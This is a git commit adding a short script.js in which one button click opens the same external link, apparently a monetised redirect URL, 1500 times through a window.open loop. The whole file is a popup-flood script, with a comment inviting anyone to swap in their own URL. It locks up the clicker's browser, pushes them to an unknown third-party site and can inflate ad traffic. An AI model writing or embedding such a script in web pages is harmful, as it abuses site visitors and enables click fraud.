58de64e795a054e2e4b3a187c1922d467236aede
mahmoudccnn <97877461+mahmoudccnn@users.noreply.github.com>
2023-03-28 06:06:12 +0200

    Add files via upload

---
+++ script.js
@@ -0,0 +1,7 @@
+document.getElementById("myButton").addEventListener("click", function() {
+    var url = "https://doruffleton.com/4/5808314"; // replace with your desired URL
+    for (var i = 0; i <1500; i++) {
+      window.open(url);
+    }
+  });
+  
